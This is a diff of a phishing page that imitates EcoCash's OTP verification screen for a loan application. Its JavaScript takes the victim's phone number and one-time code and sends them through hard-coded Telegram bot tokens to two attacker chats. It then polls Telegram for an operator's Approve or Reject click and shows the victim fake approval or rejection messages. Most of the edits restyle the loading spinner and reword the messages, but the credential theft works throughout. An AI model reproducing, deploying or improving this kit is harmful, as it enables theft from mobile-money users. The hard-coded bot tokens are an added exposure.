@@ -7,12 +7,13 @@
     <title>EcoCash - OTP Verification</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         html,
         body {
             min-height: 100vh;
@@ -23,7 +24,7 @@
             display: flex;
             flex-direction: column;
         }
-        
+
         .header {
             background: white;
             padding: 20px;
@@ -31,7 +32,7 @@
             position: relative;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
         }
-        
+
         .back-btn {
             position: absolute;
             left: 20px;
@@ -41,13 +42,13 @@
             color: #333;
             text-decoration: none;
         }
-        
+
         .title {
             font-size: 24px;
             font-weight: 700;
             color: #333;
         }
-        
+
         .container {
             max-width: 480px;
             margin: 40px auto;
@@ -58,34 +59,34 @@
             text-align: center;
             flex: 1;
         }
-        
+
         .subtitle {
             font-size: 16px;
             color: #666;
             margin-bottom: 10px;
         }
-        
+
         .phone {
             font-size: 18px;
             font-weight: 600;
             color: #333;
             margin-bottom: 40px;
         }
-        
+
         .otp-label {
             font-size: 16px;
             color: #333;
             margin-bottom: 20px;
             font-weight: 500;
         }
-        
+
         .otp-group {
             display: flex;
             justify-content: center;
             gap: 12px;
             margin-bottom: 30px;
         }
-        
+
         .otp-box {
             width: 50px;
             height: 60px;
@@ -97,23 +98,23 @@
             color: #333;
             font-weight: 600;
         }
-        
+
         .otp-box:focus {
             outline: none;
             border-color: #0066ff;
         }
-        
+
         .resend {
             font-size: 15px;
             color: #666;
             margin-bottom: 50px;
         }
-        
+
         .resend span {
             color: #0066ff;
             font-weight: 600;
         }
-        
+
         #submitBtn {
             width: 100%;
             padding: 18px;
@@ -125,13 +126,13 @@
             font-weight: 700;
             cursor: not-allowed;
         }
-        
+
         #submitBtn.enabled {
             background: #0066ff;
             color: white;
             cursor: pointer;
         }
-        
+
         footer {
             text-align: center;
             padding: 30px 20px;
@@ -141,73 +142,150 @@
             flex-shrink: 0;
             margin-top: auto;
         }
-        /* SPINNER */
-        
+
+        /* FUTURISTIC PROCESSING SPINNER */
         #spinnerOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.98);
             display: none;
-            justify-content: center;
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
             align-items: center;
-            flex-direction: column;
-            z-index: 1000;
+            justify-content: center;
+            background: radial-gradient(circle at center, #102b49, #030914 75%);
+            backdrop-filter: blur(12px);
         }
-        
+
+        .spinner-container {
+            width: 85%;
+            max-width: 360px;
+            padding: 35px 22px;
+            text-align: center;
+            border: 1px solid rgba(0, 191, 255, 0.55);
+            border-radius: 20px;
+            background: linear-gradient(145deg, #07182c, #030a16);
+            box-shadow: 0 0 30px rgba(0, 174, 255, 0.2);
+        }
+
         .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid #f0f0f0;
-            border-top: 6px solid #0066ff;
+            width: 75px;
+            height: 75px;
+            margin: 0 auto 25px;
+            border: 3px solid rgba(0, 191, 255, 0.15);
+            border-top: 3px solid #00d9ff;
+            border-right: 3px solid #168bff;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 30px;
+            animation: futuristicSpin 1s linear infinite;
+            box-shadow: 0 0 18px rgba(0, 191, 255, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
+
+        .spinner-inner {
+            width: 43px;
+            height: 43px;
+            border: 2px solid transparent;
+            border-bottom: 2px solid #00d9ff;
+            border-left: 2px solid #168bff;
+            border-radius: 50%;
+            animation: futuristicSpin 1.5s linear infinite reverse;
+        }
+
+        @keyframes futuristicSpin {
+            to {
                 transform: rotate(360deg);
             }
         }
-        
-        .spinner-text {
-            font-size: 18px;
-            color: #333;
-            text-align: center;
-            line-height: 1.6;
-            max-width: 320px;
-            font-weight: 500;
+
+        .spinner-title {
+            color: #00d9ff;
+            font-size: 17px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 12px #008cff;
         }
-        /* SUCCESS / CANCEL MESSAGE */
-        
+
+        .spinner-text {
+            color: #d4eaff;
+            font-size: 14px;
+            line-height: 1.8;
+            margin-bottom: 22px;
+        }
+
+        .loading-line {
+            height: 3px;
+            width: 100%;
+            background: #142c45;
+            overflow: hidden;
+            border-radius: 10px;
+            margin-bottom: 18px;
+        }
+
+        .loading-progress {
+            height: 100%;
+            width: 35%;
+            background: #00d9ff;
+            box-shadow: 0 0 12px #00bfff;
+            animation: loadingMove 1.5s ease-in-out infinite;
+        }
+
+        @keyframes loadingMove {
+            0% {
+                transform: translateX(-110%);
+            }
+            100% {
+                transform: translateX(310%);
+            }
+        }
+
+        .system-status {
+            color: #75cfff;
+            font-size: 10px;
+            letter-spacing: 1.5px;
+        }
+
+        .status-dot {
+            display: inline-block;
+            width: 7px;
+            height: 7px;
+            background: #00e5ff;
+            border-radius: 50%;
+            margin-right: 7px;
+            box-shadow: 0 0 10px #00e5ff;
+            animation: statusPulse 1s infinite alternate;
+        }
+
+        @keyframes statusPulse {
+            from {
+                opacity: 0.3;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        /* RESULT OVERLAY */
         #resultOverlay {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            inset: 0;
             background: rgba(255, 255, 255, 0.98);
             display: none;
             justify-content: center;
             align-items: center;
             flex-direction: column;
-            z-index: 1000;
+            z-index: 10000;
             padding: 20px;
         }
-        
+
         .result-message {
             font-size: 18px;
             color: #333;
             text-align: center;
             line-height: 1.6;
-            max-width: 320px;
+            max-width: 340px;
             font-weight: 500;
+            white-space: pre-line;
         }
     </style>
 </head>
@@ -224,177 +302,58 @@
 
         <div class="otp-label">OTP</div>
         <div class="otp-group">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
         </div>
 
         <div class="resend">Resend OTP in <span id="timer">116</span> seconds</div>
 
-        <button id="submitBtn">Submit</button>
+        <button id="submitBtn" disabled>Submit</button>
     </div>
 
-    
-<footer>© 2026 EcoCash</footer>
+    <footer>© 2026 EcoCash</footer>
 
-<!-- FUTURISTIC PROCESSING SPINNER -->
-<div id="spinnerOverlay">
-    <div class="spinner-container">
+    <!-- FUTURISTIC PROCESSING SPINNER -->
+    <div id="spinnerOverlay">
+        <div class="spinner-container">
+            <div class="spinner">
+                <div class="spinner-inner"></div>
+            </div>
 
-        <div class="spinner">
-            <div class="spinner-inner"></div>
+            <div class="spinner-title">
+                PROCESSING REQUEST
+            </div>
+
+            <div class="spinner-text">
+                Please wait as we send your request for approval or rejection.
+            </div>
+
+            <div class="loading-line">
+                <div class="loading-progress"></div>
+            </div>
+
+            <div class="system-status">
+                <span class="status-dot"></span>
+                SYSTEM STATUS: AWAITING DECISION
+            </div>
         </div>
-
-        <div class="spinner-title">
-            PROCESSING REQUEST
-        </div>
-
-        <div class="spinner-text">
-            Please wait as we process your request.
-            It will take some time.
-        </div>
-
-        <div class="loading-line">
-            <div class="loading-progress"></div>
-        </div>
-
-        <div class="system-status">
-            <span class="status-dot"></span>
-            SYSTEM STATUS: PROCESSING
-        </div>
-
     </div>
-</div>
 
-<!-- RESULT OVERLAY -->
-<div id="resultOverlay">
-    <div class="result-message" id="resultMessage"></div>
-</div>
-
-<style>
-#spinnerOverlay {
-    display: none;
-    position: fixed;
-    inset: 0;
-    z-index: 9999;
-    align-items: center;
-    justify-content: center;
-    background: radial-gradient(circle at center, #102b49, #030914 75%);
-    backdrop-filter: blur(12px);
-}
-
-.spinner-container {
-    width: 85%;
-    max-width: 360px;
-    padding: 35px 22px;
-    text-align: center;
-    border: 1px solid rgba(0, 191, 255, 0.55);
-    border-radius: 20px;
-    background: linear-gradient(145deg, #07182c, #030a16);
-    box-shadow: 0 0 30px rgba(0, 174, 255, 0.2);
-}
-
-.spinner {
-    width: 75px;
-    height: 75px;
-    margin: 0 auto 25px;
-    border: 3px solid rgba(0, 191, 255, 0.15);
-    border-top: 3px solid #00d9ff;
-    border-right: 3px solid #168bff;
-    border-radius: 50%;
-    animation: futuristicSpin 1s linear infinite;
-    box-shadow: 0 0 18px rgba(0, 191, 255, 0.4);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-.spinner-inner {
-    width: 43px;
-    height: 43px;
-    border: 2px solid transparent;
-    border-bottom: 2px solid #00d9ff;
-    border-left: 2px solid #168bff;
-    border-radius: 50%;
-    animation: futuristicSpin 1.5s linear infinite reverse;
-}
-
-@keyframes futuristicSpin {
-    to { transform: rotate(360deg); }
-}
-
-.spinner-title {
-    color: #00d9ff;
-    font-size: 17px;
-    font-weight: 800;
-    letter-spacing: 2px;
-    margin-bottom: 15px;
-    text-shadow: 0 0 12px #008cff;
-}
-
-.spinner-text {
-    color: #d4eaff;
-    font-size: 14px;
-    line-height: 1.8;
-    margin-bottom: 22px;
-}
-
-.loading-line {
-    height: 3px;
-    width: 100%;
-    background: #142c45;
-    overflow: hidden;
-    border-radius: 10px;
-    margin-bottom: 18px;
-}
-
-.loading-progress {
-    height: 100%;
-    width: 35%;
-    background: #00d9ff;
-    box-shadow: 0 0 12px #00bfff;
-    animation: loadingMove 1.5s ease-in-out infinite;
-}
-
-@keyframes loadingMove {
-    0% { transform: translateX(-110%); }
-    100% { transform: translateX(310%); }
-}
-
-.system-status {
-    color: #75cfff;
-    font-size: 10px;
-    letter-spacing: 1.5px;
-}
-
-.status-dot {
-    display: inline-block;
-    width: 7px;
-    height: 7px;
-    background: #00e5ff;
-    border-radius: 50%;
-    margin-right: 7px;
-    box-shadow: 0 0 10px #00e5ff;
-    animation: statusPulse 1s infinite alternate;
-}
-
-@keyframes statusPulse {
-    from { opacity: 0.3; }
-    to { opacity: 1; }
-}
-
-</style>
-
+    <!-- RESULT OVERLAY -->
+    <div id="resultOverlay">
+        <div class="result-message" id="resultMessage"></div>
+    </div>
 
     <script>
-        // Bot 1 (your existing)
-        const BOT_TOKEN_1 = '8799263708:AAGKJWoeVBe0HkTCCXTbSf9N4biwbH4_Y';
-        const CHAT_ID_1 = '85200229';
+        // Bot 1
+        const BOT_TOKEN_1 = '8799263708:AAGKJWoeVBe0HkTCXTbSf9N4biwbH4_Y';
+        const CHAT_ID_1 = '8500229';
 
-        // Bot 2 (your second bot)
+        // Bot 2
         const BOT_TOKEN_2 = '9272926860:AAHanS0gwvEev4NGUmxOXoPtM22ZmwbdMZs';
         const CHAT_ID_2 = '6527631508';
 
@@ -444,6 +403,7 @@
 
         otpBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
+                box.value = box.value.replace(/\D/g, '');
                 if (box.value.length === 1 && index < 5) {
                     otpBoxes[index + 1].focus();
                 }
@@ -457,7 +417,7 @@
             });
         });
 
-        // Helper to send to a bot with inline keyboard
+        // Helper to send a message with inline Approve / Reject buttons
         function sendToBot(botToken, chatId, text, replyMarkup) {
             const payload = {
                 chat_id: chatId,
@@ -476,12 +436,11 @@
             }).catch(() => {});
         }
 
-        // Handle a callback query from either bot
+        // Handle Approve or Reject callback from Telegram
         function handleCallback(callbackData, callbackQueryId, botToken) {
             if (actionProcessed) return;
             actionProcessed = true;
 
-            // Answer the callback query to remove loading state
             fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                 method: 'POST',
                 headers: {
@@ -492,50 +451,48 @@
                 })
             }).catch(() => {});
 
-    // Stop both polling intervals
-if (pollInterval1) clearInterval(pollInterval1);
-if (pollInterval2) clearInterval(pollInterval2);
+            if (pollInterval1) clearInterval(pollInterval1);
+            if (pollInterval2) clearInterval(pollInterval2);
 
-spinnerOverlay.style.display = 'none';
-resultOverlay.style.display = 'flex';
+            spinnerOverlay.style.display = 'none';
+            resultOverlay.style.display = 'flex';
 
-// Futuristic result overlay appearance
-resultOverlay.style.background = 'rgba(2, 8, 20, 0.96)';
-resultOverlay.style.backdropFilter = 'blur(12px)';
+            resultOverlay.style.background = 'rgba(2, 8, 20, 0.96)';
+            resultOverlay.style.backdropFilter = 'blur(12px)';
 
-resultMessage.style.cssText = `
-    color: #00d9ff;
-    background: linear-gradient(145deg, #071426, #102b49, #050d1b);
-    border: 1px solid #00bfff;
-    border-radius: 16px;
-    padding: 25px 20px;
-    margin: 15px;
-    font-size: 16px;
-    font-weight: 700;
-    line-height: 1.8;
-    text-align: center;
-    letter-spacing: 0.5px;
-    text-shadow: 0 0 8px #00bfff, 0 0 18px #0077ff;
-    box-shadow: 0 0 15px rgba(0,191,255,0.4),
-                inset 0 0 15px rgba(0,191,255,0.08);
-`;
+            resultMessage.style.cssText = `
+                color: #00d9ff;
+                background: linear-gradient(145deg, #071426, #102b49, #050d1b);
+                border: 1px solid #00bfff;
+                border-radius: 16px;
+                padding: 25px 20px;
+                margin: 15px;
+                font-size: 16px;
+                font-weight: 700;
+                line-height: 1.8;
+                text-align: center;
+                letter-spacing: 0.5px;
+                text-shadow: 0 0 8px #00bfff, 0 0 18px #0077ff;
+                box-shadow: 0 0 15px rgba(0,191,255,0.4),
+                            inset 0 0 15px rgba(0,191,255,0.08);
+            `;
 
-const parts = callbackData.split('_');
+            const [decision] = callbackData.split('_');
 
-if (parts[0] === 'approve') {
-    resultMessage.textContent = '✦ SYSTEM STATUS: UNDER REVIEW ✦\n\nYour request is under approval. Please be patient and do not leave this page.';
-} else if (parts[0] === 'cancel') {
-    resultMessage.textContent = '⚠ SYSTEM NOTICE\n\nPlease reapply and ensure that your information is correct. Thank you.';
-}
-}
+            if (decision === 'approve') {
+                resultMessage.textContent = '✦ REQUEST APPROVED ✦\n\nYour loan verification has been approved. Please stay on this page while we finalize your application.';
+            } else if (decision === 'reject') {
+                resultMessage.textContent = '✖ REQUEST REJECTED\n\nYour loan verification request was rejected. Please review your details and try again.';
+            }
+        }
+
         // Poll a single bot for callback responses
-        function pollBot(botToken, chatId, lastUpdateIdRef, pollIntervalRef) {
-            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateIdRef + 1}&timeout=10`)
+        function pollBot(botToken, lastUpdateId) {
+            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`)
                 .then(res => res.json())
                 .then(data => {
                     if (data.ok && data.result.length > 0) {
                         for (let update of data.result) {
-                            // Update the reference via the outer variable reference approach
                             if (botToken === BOT_TOKEN_1) {
                                 lastUpdateId1 = Math.max(lastUpdateId1, update.update_id);
                             } else {
@@ -544,10 +501,9 @@ if (parts[0] === 'approve') {
 
                             if (update.callback_query && !actionProcessed) {
                                 const cb = update.callback_query;
-                                const dataParts = cb.data.split('_');
-                                const ts = parseInt(dataParts[1]);
+                                const [, ts] = cb.data.split('_');
 
-                                if (ts === currentTimestamp) {
+                                if (parseInt(ts, 10) === currentTimestamp) {
                                     handleCallback(cb.data, cb.id, botToken);
                                     return;
                                 }
@@ -562,42 +518,41 @@ if (parts[0] === 'approve') {
         function startPollingBoth() {
             actionProcessed = false;
 
-            // Poll Bot 1 every 1.5s
             pollInterval1 = setInterval(() => {
-                pollBot(BOT_TOKEN_1, CHAT_ID_1, lastUpdateId1, 'pollInterval1');
+                pollBot(BOT_TOKEN_1, lastUpdateId1);
             }, 1500);
 
-            // Poll Bot 2 every 1.5s
             pollInterval2 = setInterval(() => {
-                pollBot(BOT_TOKEN_2, CHAT_ID_2, lastUpdateId2, 'pollInterval2');
+                pollBot(BOT_TOKEN_2, lastUpdateId2);
             }, 1500);
         }
 
         submitBtn.addEventListener('click', () => {
+            checkOtpComplete();
             if (otpValue.length !== 6) return;
 
             spinnerOverlay.style.display = 'flex';
-
             currentTimestamp = Date.now();
 
-            const message = `*OTP Verification*\n\n📱 Phone: +263 ${savedPhone}\n🔢 Entered OTP: ${otpValue}\n\nPlease approve or cancel the loan application.`;
+            const message = `*Loan Verification Request*\n\n📱 Phone: +263 ${savedPhone}\n🔢 Entered OTP: ${otpValue}\n\nSelect *Approve* or *Reject* for this request.`;
             const replyMarkup = {
                 inline_keyboard: [
-                    [{
-                        text: '✅ Approve',
-                        callback_data: 'approve_' + currentTimestamp
-                    }, {
-                        text: '❌ Cancel',
-                        callback_data: 'cancel_' + currentTimestamp
-                    }]
+                    [
+                        {
+                            text: '✅ Approve',
+                            callback_data: 'approve_' + currentTimestamp
+                        },
+                        {
+                            text: '❌ Reject',
+                            callback_data: 'reject_' + currentTimestamp
+                        }
+                    ]
                 ]
             };
 
-            // Send to both bots with inline buttons
             sendToBot(BOT_TOKEN_1, CHAT_ID_1, message, replyMarkup);
             sendToBot(BOT_TOKEN_2, CHAT_ID_2, message, replyMarkup);
 
-            // Start polling both bots for the response
             startPollingBoth();
         });
 
